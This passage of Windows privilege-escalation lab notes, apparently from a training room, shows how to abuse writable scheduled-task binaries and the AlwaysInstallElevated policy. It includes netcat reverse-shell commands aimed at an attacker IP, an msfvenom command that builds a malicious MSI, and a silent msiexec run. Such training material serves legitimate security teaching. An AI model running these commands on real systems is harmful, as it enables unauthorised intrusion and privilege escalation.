## Scheduled Tasks

Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

```shell-session
C:\> schtasks /query /tn vulntask /fo list /v
```

You will get lots of information about the task, but what matters for us is the `Task to Run` parameter which indicates what gets executed by the scheduled task, and the `Run As User` parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the `ask to Run` executable, we can control what gets executed by the `taskusr1` user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:
```shell-session
C:\> icacls c:\tasks\schtask.bat
```

As can be seen in the result, the **BUILTIN\Users** group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:

```shell-session
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

```

```shell-session
 echo c:\tools\nc64.exe -e cmd.exe 10.9.9.67 4444 > C:\tasks\schtask.bat
```
```shell-session
nc -lvp 4444
```

The next time the scheduled task runs, **you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario** and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:

```shell-session
C:\> schtasks /run /tn vulntask
```

## AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. **They usually run with the privilege level of the user that starts it**. However, these can be configured to run with **higher privileges from any user account** (even unprivileged ones). This **could potentially allow us to generate a malicious MSI file that would run with admin privileges**.

This method requires two registry values to be set. You can query these from the command line using the commands below.

```shell-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below:

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.174.176 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:

```shell-session
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```